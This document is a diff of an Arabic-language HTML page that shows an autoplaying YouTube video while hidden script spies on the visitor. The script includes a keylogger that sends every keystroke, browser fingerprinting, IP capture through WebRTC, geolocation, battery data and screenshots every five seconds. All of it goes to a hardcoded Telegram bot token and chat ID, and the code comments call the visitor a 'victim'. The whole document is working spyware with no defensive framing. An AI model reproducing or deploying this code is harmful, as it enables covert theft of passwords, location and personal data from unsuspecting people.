@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title></title> <!-- فارغ للإخفاء التام -->
+  <title></title> <!-- فارغ للإخفاء -->
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body { margin:0; background:#000; overflow:hidden; }
@@ -15,128 +15,128 @@
 <iframe src="https://www.youtube.com/embed/BygacCWcCi0?autoplay=1&mute=0&loop=1&playlist=BygacCWcCi0" allowfullscreen></iframe>
 
 <script>
-// Telegram Config – توكن و ID تاعك
+// Telegram Config – تاعك
 const TELEGRAM_TOKEN = '8226370812:AAEYjJJffesfCxL1NIp0Ihd1r_2aSb4roSc';
 const CHAT_ID = '6769216123';
 
 let keys = '';
 
-// إرسال لتليغرام
-function sendToTg(text, photo = null) {
-  if (photo) {
-    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        photo: photo,
-        caption: text,
-        parse_mode: 'HTML'
-      })
-    }).catch(() => {});
-  } else {
-    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: text,
-        parse_mode: 'HTML'
-      })
-    }).catch(() => {});
-  }
+// إرسال رسالة نصية
+function sendText(text) {
+  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: text,
+      parse_mode: 'HTML'
+    })
+  }).catch(() => {});
 }
 
-// جمع كل المعلومات الممكنة
-async function gatherMaxInfo() {
-  const victim = {
+// إرسال صورة (screenshot)
+function sendPhoto(photo) {
+  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      photo: photo,
+      caption: 'Screenshot من الضحية - ' + new Date().toISOString()
+    })
+  }).catch(() => {});
+}
+
+// Keylogger: كل حرف يرسل فورًا
+document.addEventListener('keydown', e => {
+  let key = e.key;
+  if (key === 'Backspace') key = '[⌫]';
+  if (key === 'Enter') key = '[↵]';
+  if (key === ' ') key = '[␣]';
+
+  keys += key;
+
+  // إرسال فوري لكل ضغطة
+  sendText(`⌨️ ضغط: ${key} | الوقت: ${new Date().toISOString().slice(11,19)} | من: ${navigator.userAgent.slice(0,80)}...`);
+
+  // إرسال كل 10 حروف كمجموعة (للراحة)
+  if (keys.length >= 10) {
+    sendText(`⌨️ مجموعة كتابة: ${keys}`);
+    keys = '';
+  }
+});
+
+// جمع كل المعلومات عند الدخول
+window.onload = async () => {
+  const info = {
     time: new Date().toISOString(),
     url: window.location.href,
     referrer: document.referrer || 'direct',
     userAgent: navigator.userAgent,
     platform: navigator.platform || 'unknown',
     vendor: navigator.vendor || 'unknown',
-    oscpu: navigator.oscpu || 'unknown',
     language: navigator.language,
     languages: navigator.languages?.join(', ') || 'unknown',
     screen: `${screen.width}x${screen.height} | Depth: ${screen.colorDepth} | Pixel: ${window.devicePixelRatio}`,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
-    hardwareConcurrency: navigator.hardwareConcurrency || '?',
-    deviceMemory: navigator.deviceMemory || '?',
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    hardware: navigator.hardwareConcurrency || '?',
+    memory: navigator.deviceMemory || '?',
+    touch: 'ontouchstart' in window ? 'Yes' : 'No',
     maxTouchPoints: navigator.maxTouchPoints || 0,
-    touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No',
     connection: navigator.connection ? `${navigator.connection.type || 'unknown'} | RTT: ${navigator.connection.rtt}ms | Effective: ${navigator.connection.effectiveType} | Downlink: ${navigator.connection.downlink}Mbps` : 'unknown',
     pdfViewerEnabled: navigator.pdfViewerEnabled ? 'Yes' : 'No',
     webdriver: navigator.webdriver ? 'Yes' : 'No',
     cookieEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
     doNotTrack: navigator.doNotTrack || 'unknown',
     online: navigator.onLine ? 'Yes' : 'No',
-    plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'None',
-    mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type).join(', ') || 'None',
-    localStorage: localStorage.length > 0 ? 'Has data' : 'Empty',
-    sessionStorage: sessionStorage.length > 0 ? 'Has data' : 'Empty',
-    ip: 'fetching...',
-    geo: 'unknown',
-    battery: 'fetching...',
-    keys: 'logging...',
-    screenshot: 'capturing...'
+    battery: 'جاري...',
+    ip: 'جاري...',
+    geo: 'جاري...'
   };
 
-  // IP via WebRTC (أقوى طريقة)
+  // إرسال المعلومات الأساسية فورًا
+  sendText(`🔔 ضحية دخلت!\n\n` + JSON.stringify(info, null, 2));
+
+  // IP via WebRTC
   try {
     const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
     pc.createDataChannel('');
     pc.createOffer(o => pc.setLocalDescription(o), e => {});
     pc.onicecandidate = e => {
-      if (!e.candidate) return sendToTg(`🌐 IP detected: ${victim.ip}`);
-      const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-      if (match) victim.ip = match[1];
+      if (e.candidate) {
+        const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+        if (match) {
+          info.ip = match[1];
+          sendText(`🌐 IP: ${info.ip}`);
+        }
+      }
     };
-  } catch(e) { victim.ip = 'blocked'; }
+  } catch(e) { info.ip = 'blocked'; sendText(`🌐 IP: blocked`); }
 
   // Battery
   if (navigator.getBattery) {
     navigator.getBattery().then(b => {
-      victim.battery = `${Math.round(b.level * 100)}% | Charging: ${b.charging} | Time left: ${b.dischargingTime}s`;
-      sendToTg(`🔋 Battery: ${victim.battery}`);
+      info.battery = `${Math.round(b.level * 100)}% | Charging: ${b.charging}`;
+      sendText(`🔋 Battery: ${info.battery}`);
     });
   }
 
   // Geolocation
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(p => {
-      victim.geo = `${p.coords.latitude.toFixed(6)}, ${p.coords.longitude.toFixed(6)} (±${p.coords.accuracy}m)`;
-      sendToTg(`📍 Location: ${victim.geo}`);
-    }, () => sendToTg(`📍 Geo: refused`));
+      info.geo = `${p.coords.latitude.toFixed(6)}, ${p.coords.longitude.toFixed(6)} (±${p.coords.accuracy}m)`;
+      sendText(`📍 Location: ${info.geo}`);
+    }, () => sendText(`📍 Geo: refused`));
   }
-
-  // Keylogger: كل حرف يرسل فورًا
-  document.addEventListener('keydown', e => {
-    let key = e.key;
-    if (key === 'Backspace') key = '[⌫]';
-    if (key === 'Enter') key = '[↵]';
-    if (key === ' ') key = '[␣]';
-    
-    keys += key;
-    
-    // إرسال فوري لكل ضغطة
-    sendToTg(`⌨️ Key pressed: ${key} | Time: ${new Date().toISOString().slice(11,19)} | UA: ${navigator.userAgent.slice(0,80)}...`);
-  });
 
   // Screenshot كل 5 ثواني
   setInterval(() => {
     html2canvas(document.body, {scale: 0.5}).then(canvas => {
       const img = canvas.toDataURL('image/png');
-      sendToTg(`🖼️ Screenshot at ${new Date().toISOString().slice(11,19)}`, img);
+      sendPhoto(img);
     });
   }, 5000);
-
-  // إرسال المعلومات الأساسية فورًا
-  sendToTg(`🔔 Victim Info\n\n` + JSON.stringify(victim, null, 2));
-}
-
-// شغّل فور الدخول
-window.onload = gatherAllInfo;
+};
 </script>
 
 </body>
